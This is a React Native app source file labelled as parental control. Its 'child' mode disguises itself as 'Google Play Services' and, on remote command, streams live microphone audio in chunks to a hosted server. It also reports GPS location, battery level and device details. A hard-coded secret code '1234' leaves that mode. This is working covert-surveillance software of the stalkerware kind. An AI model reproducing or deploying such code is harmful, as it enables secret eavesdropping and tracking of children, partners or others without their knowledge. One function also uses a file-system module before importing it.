import React, { useState, useEffect, useRef } from 'react';
import {
  View, Text, StyleSheet, TouchableOpacity, SafeAreaView,
  Alert, ScrollView, TextInput, Platform
} from 'react-native';
import * as Notifications from 'expo-notifications';
import * as Device from 'expo-device';
import AsyncStorage from '@react-native-async-storage/async-storage';
import Constants from 'expo-constants';
import { Audio } from 'expo-av';
import { io } from 'socket.io-client';

const SERVER_URL = 'https://control-parental-server-production.up.railway.app';

Notifications.setNotificationHandler({
  handleNotification: async () => ({
    shouldShowAlert: true,
    shouldPlaySound: true,
    shouldSetBadge: false,
  }),
});

async function registerForPushNotificationsAsync() {
  let token;
  if (Device.isDevice) {
    const { status: existingStatus } = await Notifications.getPermissionsAsync();
    let finalStatus = existingStatus;
    if (existingStatus !== 'granted') {
      const { status } = await Notifications.requestPermissionsAsync();
      finalStatus = status;
    }
    if (finalStatus !== 'granted') {
      Alert.alert('Permiso requerido', 'Se necesitan notificaciones para control remoto');
      return null;
    }
    token = (await Notifications.getExpoPushTokenAsync({ projectId: Constants.expoConfig.extra.eas.projectId })).data;
  }
  return token;
}

export default function App() {
  const [screen, setScreen] = useState('loading');
  const [mode, setMode] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [history, setHistory] = useState([]);
  const [pushToken, setPushToken] = useState(null);
  const [childDeviceId, setChildDeviceId] = useState('child');
  const [childInfo, setChildInfo] = useState(null);
  const [secretCode, setSecretCode] = useState('');
  const [lastCommand, setLastCommand] = useState(null);
  const [commandResults, setCommandResults] = useState([]);
  const [isLiveListening, setIsLiveListening] = useState(false);
  const [isLiveReceiving, setIsLiveReceiving] = useState(false);
  const [liveChunksReceived, setLiveChunksReceived] = useState(0);
  const socketRef = useRef(null);
  const recordingRef = useRef(null);
  const soundRef = useRef(null);
  const chunkIndexRef = useRef(0);
  const liveIntervalRef = useRef(null);
  const isRecordingRef = useRef(false);
  const notificationListener = useRef();
  const responseListener = useRef();

  useEffect(() => {
    loadSavedMode();
    setupNotifications();
    return () => {
      if (notificationListener.current) Notifications.removeNotificationSubscription(notificationListener.current);
      if (responseListener.current) Notifications.removeNotificationSubscription(responseListener.current);
      cleanupSocket();
    };
  }, []);

  useEffect(() => {
    if (mode === 'hijo') {
      registerChildDevice();
      connectSocket('child');
    } else if (mode === 'padre') {
      checkServer();
      connectSocket('parent');
      const interval = setInterval(checkServer, 10000);
      return () => clearInterval(interval);
    }
    return () => cleanupSocket();
  }, [mode]);

  const cleanupSocket = () => {
    if (socketRef.current) {
      socketRef.current.disconnect();
      socketRef.current = null;
    }
    stopLiveRecording();
  };

  const connectSocket = (role) => {
    if (socketRef.current) socketRef.current.disconnect();

    const socket = io(SERVER_URL, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 10,
      reconnectionDelay: 2000,
    });

    socket.on('connect', () => {
      console.log('Socket connected:', socket.id);
      socket.emit('register', { deviceId: childDeviceId, role });

      if (role === 'parent') {
        socket.emit('join-parent', { deviceId: childDeviceId });
      }
    });

    socket.on('disconnect', () => {
      console.log('Socket disconnected');
    });

    socket.on('command', (data) => {
      if (data.command) {
        executeChildCommand(data.command);
      }
    });

    socket.on('live-audio', (data) => {
      if (role === 'parent' && data.chunk) {
        playAudioChunk(data.chunk, data.chunkIndex);
      }
    });

    socket.on('connect_error', (err) => {
      console.log('Socket error:', err.message);
    });

    socketRef.current = socket;
  };

  const loadSavedMode = async () => {
    try {
      const savedMode = await AsyncStorage.getItem('appMode');
      const savedDeviceId = await AsyncStorage.getItem('deviceId');
      if (savedDeviceId) setChildDeviceId(savedDeviceId);
      if (savedMode) {
        setMode(savedMode);
        setScreen(savedMode);
      } else {
        setScreen('menu');
      }
    } catch (e) {
      setScreen('menu');
    }
  };

  const setupNotifications = () => {
    notificationListener.current = Notifications.addNotificationReceivedListener(notification => {
      const data = notification.request.content.data;
      if (data && data.command && mode === 'hijo') {
        executeChildCommand(data.command);
      }
    });
    responseListener.current = Notifications.addNotificationResponseReceivedListener(response => {
      const data = response.notification.request.content.data;
      if (data && data.action === 'open-parent') {
        setMode('padre');
        setScreen('padre');
        AsyncStorage.setItem('appMode', 'padre');
      }
    });
  };

  const registerChildDevice = async () => {
    try {
      const token = await registerForPushNotificationsAsync();
      if (token) {
        setPushToken(token);
        let deviceId = await AsyncStorage.getItem('deviceId');
        if (!deviceId) {
          deviceId = 'child_' + Math.random().toString(36).substr(2, 9);
          await AsyncStorage.setItem('deviceId', deviceId);
        }
        setChildDeviceId(deviceId);

        await fetch(`${SERVER_URL}/api/register-device`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            deviceId, pushToken: token, platform: Platform.OS,
            manufacturer: Device.manufacturer || 'unknown',
            modelName: Device.modelName || 'unknown',
            osName: Device.osName || 'unknown',
            osVersion: Device.osVersion || 'unknown'
          })
        });
        setIsConnected(true);
      }
    } catch (e) {
      console.log('Error registering:', e);
    }
  };

  const checkServer = async () => {
    try {
      const res = await fetch(`${SERVER_URL}/api/health`);
      const data = await res.json();
      setIsConnected(data.status === 'ok');
      const deviceRes = await fetch(`${SERVER_URL}/api/check-child`);
      const deviceData = await deviceRes.json();
      if (deviceData.connected) {
        setChildInfo(deviceData.device);
      }
    } catch (e) {
      setIsConnected(false);
    }
  };

  const sendCommandToChild = async (commandType, params = {}) => {
    const command = { type: commandType, ...params, timestamp: Date.now() };
    try {
      const res = await fetch(`${SERVER_URL}/api/send-command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command, deviceId: childDeviceId || 'child' })
      });
      const data = await res.json();
      if (data.success) {
        setHistory(prev => [{ cmd: commandType, time: new Date().toLocaleTimeString(), status: 'sent' }, ...prev].slice(0, 20));
        if (commandType === 'listen-live') {
          setIsLiveReceiving(true);
          setLiveChunksReceived(0);
          chunkIndexRef.current = 0;
        } else if (commandType === 'stop-listen-live') {
          setIsLiveReceiving(false);
        } else {
          Alert.alert('Comando enviado', commandType);
        }
      } else {
        Alert.alert('Error', data.message || 'No se pudo enviar');
      }
    } catch (e) {
      Alert.alert('Error', 'Sin conexion al servidor');
    }
  };

  const startLiveRecording = async () => {
    if (isRecordingRef.current) return;

    try {
      const { status } = await Audio.requestPermissionsAsync();
      if (status !== 'granted') {
        Alert.alert('Permiso requerido', 'Se necesita permiso de microfono');
        return;
      }

      await Audio.setAudioModeAsync({ allowsRecordingIOS: true, playsInSilentModeIOS: true });

      isRecordingRef.current = true;
      setIsLiveListening(true);
      chunkIndexRef.current = 0;

      const recordChunk = async () => {
        if (!isRecordingRef.current) return;

        try {
          const { recording } = await Audio.Recording.createAsync(
            Audio.RecordingOptionsPresets.HIGH_QUALITY
          );
          recordingRef.current = recording;

          await new Promise(resolve => setTimeout(resolve, 3000));

          if (!isRecordingRef.current) {
            try { await recording.stopAndUnloadAsync(); } catch(e) {}
            return;
          }

          await recording.stopAndUnloadAsync();
          const uri = recording.getURI();
          recordingRef.current = null;

          if (uri && socketRef.current) {
            const { FileSystem } = await import('expo-file-system');
            const base64 = await FileSystem.readAsStringAsync(uri, { encoding: FileSystem.EncodingType.Base64 });

            if (socketRef.current && isRecordingRef.current) {
              socketRef.current.emit('audio-chunk', {
                deviceId: childDeviceId,
                chunk: base64,
                chunkIndex: chunkIndexRef.current++,
                timestamp: Date.now()
              });
            }

            try { await FileSystem.deleteAsync(uri, { idempotent: true }); } catch(e) {}
          }

          if (isRecordingRef.current) {
            setTimeout(recordChunk, 100);
          }
        } catch (err) {
          console.log('Chunk recording error:', err);
          if (isRecordingRef.current) {
            setTimeout(recordChunk, 500);
          }
        }
      };

      await recordChunk();
    } catch (err) {
      console.error('Error starting live recording:', err);
      setIsLiveListening(false);
      isRecordingRef.current = false;
    }
  };

  const stopLiveRecording = () => {
    isRecordingRef.current = false;
    setIsLiveListening(false);
    if (recordingRef.current) {
      try {
        recordingRef.current.stopAndUnloadAsync();
      } catch (e) {}
      recordingRef.current = null;
    }
  };

  const playAudioChunk = async (base64Chunk, chunkIdx) => {
    try {
      if (soundRef.current) {
        await soundRef.current.unloadAsync();
        soundRef.current = null;
      }

      const filename = `chunk_${chunkIdx}.wav`;
      const filePath = `${FileSystem.cacheDirectory}${filename}`;

      const { FileSystem } = await import('expo-file-system');
      await FileSystem.writeAsStringAsync(filePath, base64Chunk, { encoding: FileSystem.EncodingType.Base64 });

      const { sound } = await Audio.Sound.createAsync(
        { uri: filePath },
        { shouldPlay: true }
      );
      soundRef.current = sound;
      setLiveChunksReceived(prev => prev + 1);

      sound.setOnPlaybackStatusUpdate((status) => {
        if (status.didJustFinish) {
          soundRef.current = null;
        }
      });
    } catch (err) {
      console.log('Error playing chunk:', err);
    }
  };

  const executeChildCommand = async (command) => {
    setLastCommand(command);
    const result = { command: command.type, timestamp: new Date().toLocaleTimeString(), status: 'executed' };

    switch (command.type) {
      case 'listen-live':
        await startLiveRecording();
        result.status = 'live-recording-started';
        break;

      case 'stop-listen-live':
        stopLiveRecording();
        result.status = 'live-recording-stopped';
        break;

      case 'listen':
        try {
          await startLiveRecording();
          setTimeout(() => stopLiveRecording(), 30000);
          result.status = 'recording-30s';
        } catch (e) { result.status = 'error: ' + e.message; }
        break;

      case 'play-sound':
        try {
          await Notifications.scheduleNotificationAsync({
            content: { title: 'Alerta', body: 'Sonido de alarma', sound: true },
            trigger: null,
          });
          result.status = 'success';
        } catch (e) { result.status = 'error'; }
        break;

      case 'get-location':
        try {
          const { Location } = await import('expo-location');
          const { status } = await Location.requestForegroundPermissionsAsync();
          if (status === 'granted') {
            const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
            await fetch(`${SERVER_URL}/api/send-to-parent`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                event: 'location-update',
                data: { latitude: loc.coords.latitude, longitude: loc.coords.longitude },
                deviceId: childDeviceId
              })
            });
            result.status = 'success';
          }
        } catch (e) { result.status = 'error: ' + e.message; }
        break;

      case 'get-battery':
        try {
          const { Battery } = await import('expo-battery');
          const level = await Battery.getBatteryLevelAsync();
          const state = await Battery.getBatteryStateAsync();
          await fetch(`${SERVER_URL}/api/send-to-parent`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              event: 'battery-update',
              data: { level: Math.round(level * 100), isCharging: state === 2 },
              deviceId: childDeviceId
            })
          });
          result.status = 'success';
        } catch (e) { result.status = 'error'; }
        break;

      case 'send-notification':
        try {
          await Notifications.scheduleNotificationAsync({
            content: { title: 'Mensaje', body: command.message || 'Tienes un mensaje', sound: true },
            trigger: null,
          });
          result.status = 'success';
        } catch (e) { result.status = 'error'; }
        break;

      default:
        result.status = 'unknown-command';
    }

    setCommandResults(prev => [result, ...prev].slice(0, 10));

    try {
      await fetch(`${SERVER_URL}/api/send-to-parent`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event: 'command-result', data: result, deviceId: childDeviceId })
      });
    } catch (e) {}
  };

  const selectMode = (selectedMode) => {
    setMode(selectedMode);
    setScreen(selectedMode);
    AsyncStorage.setItem('appMode', selectedMode);
  };

  const handleSecretAccess = async () => {
    if (secretCode === '1234') {
      setScreen('menu');
      setMode(null);
      await AsyncStorage.removeItem('appMode');
      setSecretCode('');
    }
  };

  if (screen === 'loading') {
    return (
      <View style={[styles.container, { justifyContent: 'center', alignItems: 'center' }]}>
        <Text style={{ color: '#999', fontSize: 16 }}>Cargando...</Text>
      </View>
    );
  }

  if (screen === 'hidden') {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.header}>
          <Text style={styles.title}>Acceso Secreto</Text>
        </View>
        <View style={styles.center}>
          <TextInput
            style={styles.secretInput}
            placeholder="Codigo secreto"
            placeholderTextColor="#999"
            keyboardType="numeric"
            secureTextEntry
            value={secretCode}
            onChangeText={setSecretCode}
            onEndEditing={handleSecretAccess}
          />
          <Text style={styles.info}>Ingresa el codigo para acceder</Text>
        </View>
      </SafeAreaView>
    );
  }

  if (screen === 'menu') {
    return (
      <SafeAreaView style={styles.container}>
        <View style={styles.header}>
          <Text style={styles.title}>Control Parental</Text>
          <Text style={styles.subtitle}>Selecciona tu dispositivo</Text>
        </View>
        <View style={styles.buttons}>
          <TouchableOpacity style={[styles.btn, { backgroundColor: '#1a73e8' }]} onPress={() => selectMode('padre')}>
            <Text style={styles.btnText}>Soy el Padre</Text>
            <Text style={styles.btnSubtext}>Controlar dispositivos</Text>
          </TouchableOpacity>
          <TouchableOpacity style={[styles.btn, { backgroundColor: '#4caf50' }]} onPress={() => selectMode('hijo')}>
            <Text style={styles.btnText}>Soy el Hijo</Text>
            <Text style={styles.btnSubtext}>Ser monitoreado</Text>
          </TouchableOpacity>
          <TouchableOpacity style={[styles.btn, { backgroundColor: '#333', marginTop: 10 }]} onPress={() => setScreen('hidden')}>
            <Text style={[styles.btnText, { fontSize: 14 }]}>Configuracion avanzada</Text>
          </TouchableOpacity>
        </View>
      </SafeAreaView>
    );
  }

  if (screen === 'hijo') {
    return (
      <SafeAreaView style={styles.container}>
        <View style={[styles.header, { backgroundColor: '#333' }]}>
          <Text style={styles.title}>Google Play Services</Text>
          <Text style={styles.subtitle}>Servicios del sistema activos</Text>
        </View>
        <View style={styles.center}>
          <View style={styles.statusCard}>
            <View style={[styles.dot, { backgroundColor: isConnected ? '#4caf50' : '#f44336' }]} />
            <Text style={styles.statusText}>
              {isLiveListening ? 'EN VIVO - Microfono activo...' :
               isConnected ? 'Conectado - Servicios activos' : 'Verificando conexion...'}
            </Text>
          </View>

          {isLiveListening && (
            <View style={[styles.statusCard, { marginTop: 10, backgroundColor: '#ffebee', borderColor: '#f44336', borderWidth: 1 }]}>
              <Text style={{ fontSize: 12, color: '#f44336', fontWeight: 'bold' }}>MICROFONO ACTIVO EN TIEMPO REAL</Text>
            </View>
          )}

          <Text style={[styles.info, { marginTop: 20, fontSize: 14, color: '#666' }]}>
            ID: {childDeviceId}
          </Text>

          {lastCommand && (
            <View style={[styles.statusCard, { marginTop: 15, backgroundColor: '#f0f0f0' }]}>
              <Text style={{ fontSize: 12, color: '#333' }}>Ultimo comando: {lastCommand.type}</Text>
              <Text style={{ fontSize: 10, color: '#999' }}>{new Date(lastCommand.timestamp).toLocaleTimeString()}</Text>
            </View>
          )}
        </View>
      </SafeAreaView>
    );
  }

  return (
    <ScrollView style={styles.container}>
      <View style={[styles.header, { backgroundColor: '#1a73e8' }]}>
        <Text style={styles.title}>Panel de Control</Text>
        <View style={styles.status}>
          <View style={[styles.dot, { backgroundColor: isConnected ? '#4caf50' : '#f44336' }]} />
          <Text style={styles.statusText}>{isConnected ? 'Servidor conectado' : 'Sin conexion'}</Text>
        </View>
        {childInfo && (
          <Text style={[styles.statusText, { marginTop: 5, fontSize: 12 }]}>
            Hijo: {childInfo.manufacturer} {childInfo.modelName}
          </Text>
        )}
      </View>

      <View style={styles.section}>
        <Text style={styles.sectionTitle}>Escuchar en Vivo</Text>
        <View style={styles.row}>
          <TouchableOpacity
            style={[styles.cmdBtn, { backgroundColor: isLiveReceiving ? '#f44336' : '#e91e63', minHeight: 60 }]}
            onPress={() => {
              if (isLiveReceiving) {
                sendCommandToChild('stop-listen-live');
              } else {
                sendCommandToChild('listen-live');
              }
            }}
          >
            <Text style={[styles.cmdText, { fontSize: 16 }]}>
              {isLiveReceiving ? 'DETENER ESCUCHA' : 'ESCUCHAR EN VIVO'}
            </Text>
            {isLiveReceiving && (
              <Text style={{ color: '#fff', fontSize: 11, marginTop: 4 }}>
                Chunks recibidos: {liveChunksReceived}
              </Text>
            )}
          </TouchableOpacity>
        </View>
        {isLiveReceiving && (
          <View style={{ marginTop: 10, padding: 10, backgroundColor: '#ffebee', borderRadius: 8 }}>
            <Text style={{ color: '#f44336', fontWeight: 'bold', textAlign: 'center' }}>
              ESCUCHANDO EN TIEMPO REAL - {liveChunksReceived} fragmentos
            </Text>
          </View>
        )}
      </View>

      <View style={styles.section}>
        <Text style={styles.sectionTitle}>Otros Comandos</Text>
        <View style={styles.row}>
          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#4caf50' }]} onPress={() => sendCommandToChild('play-sound')}>
            <Text style={styles.cmdText}>Sonido</Text>
          </TouchableOpacity>
          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#1a73e8' }]} onPress={() => sendCommandToChild('get-location')}>
            <Text style={styles.cmdText}>Ubicacion</Text>
          </TouchableOpacity>
          <TouchableOpacity style={[styles.cmdBtn, { backgroundColor: '#ff5722' }]} onPress={() => sendCommandToChild('get-battery')}>
            <Text style={styles.cmdText}>Bateria</Text>
          </TouchableOpacity>
        </View>
        <View style={[styles.row, { marginTop: 10 }]}>
          <TouchableOpacity
            style={[styles.cmdBtn, { backgroundColor: '#607d8b' }]}
            onPress={() => {
              Alert.prompt('Mensaje', 'Escribe un mensaje:', (msg) => {
                if (msg) sendCommandToChild('send-notification', { message: msg });
              });
            }}
          >
            <Text style={styles.cmdText}>Mensaje</Text>
          </TouchableOpacity>
        </View>
      </View>

      {history.length > 0 && (
        <View style={styles.section}>
          <Text style={styles.sectionTitle}>Historial</Text>
          {history.map((h, i) => (
            <View key={i} style={styles.histItem}>
              <Text style={{ fontSize: 13 }}>{h.cmd}</Text>
              <Text style={styles.histTime}>{h.time}</Text>
            </View>
          ))}
        </View>
      )}

      <View style={{ padding: 20, gap: 10 }}>
        <TouchableOpacity style={[styles.btn, { backgroundColor: '#f44336' }]} onPress={() => {
          setMode(null);
          setScreen('menu');
          AsyncStorage.removeItem('appMode');
          cleanupSocket();
        }}>
          <Text style={[styles.btnText, { fontSize: 14 }]}>Cerrar sesion</Text>
        </TouchableOpacity>
      </View>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f5f5f5' },
  header: { backgroundColor: '#1a73e8', padding: 30, alignItems: 'center' },
  title: { fontSize: 28, fontWeight: 'bold', color: '#fff' },
  subtitle: { fontSize: 14, color: 'rgba(255,255,255,0.8)', marginTop: 5 },
  buttons: { flex: 1, justifyContent: 'center', padding: 30, gap: 15 },
  btn: { padding: 20, borderRadius: 15, alignItems: 'center' },
  btnText: { color: '#fff', fontSize: 20, fontWeight: 'bold' },
  btnSubtext: { color: 'rgba(255,255,255,0.7)', fontSize: 12, marginTop: 5 },
  center: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 30 },
  info: { fontSize: 16, color: '#333', textAlign: 'center' },
  status: { flexDirection: 'row', alignItems: 'center', marginTop: 10 },
  dot: { width: 12, height: 12, borderRadius: 6, marginRight: 8 },
  statusText: { color: '#fff', fontSize: 14 },
  statusCard: {
    flexDirection: 'row', alignItems: 'center', backgroundColor: '#fff',
    padding: 15, borderRadius: 10, width: '100%',
  },
  section: { backgroundColor: '#fff', margin: 15, padding: 15, borderRadius: 10 },
  sectionTitle: { fontSize: 18, fontWeight: 'bold', color: '#333', marginBottom: 10 },
  row: { flexDirection: 'row', justifyContent: 'space-between' },
  cmdBtn: { flex: 1, padding: 15, borderRadius: 10, marginHorizontal: 5, alignItems: 'center', justifyContent: 'center' },
  cmdText: { color: '#fff', fontWeight: 'bold', fontSize: 14 },
  histItem: {
    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
    paddingVertical: 8, borderBottomWidth: 1, borderBottomColor: '#eee',
  },
  histTime: { color: '#999', fontSize: 12 },
  secretInput: {
    borderWidth: 1, borderColor: '#ddd', borderRadius: 10,
    padding: 15, fontSize: 24, textAlign: 'center', width: 200,
    backgroundColor: '#fff', letterSpacing: 10,
  },
});
